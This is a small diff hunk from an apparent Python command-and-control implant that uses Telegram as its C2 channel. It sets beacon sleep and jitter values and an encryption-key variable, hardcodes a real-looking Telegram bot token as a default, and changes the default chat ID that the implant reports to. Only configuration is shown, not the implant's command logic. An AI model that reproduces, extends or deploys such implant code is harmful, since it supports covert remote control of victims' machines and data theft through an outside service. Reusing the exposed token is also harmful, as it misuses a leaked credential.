@@ -29,7 +29,7 @@ except ImportError:
 # Telegram C2 works directly - no public URL needed
 C2_URL   = os.environ.get("C2_URL", "")  # Empty = Telegram C2 mode (default)
 TELEGRAM_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc")
-TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "8667199004")
+TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "5804150664")
 SLEEP    = int(os.environ.get("SLEEP",  "3"))
 JITTER   = int(os.environ.get("JITTER", "5"))
 ENC_KEY  = os.environ.get("ENC_KEY",   "")
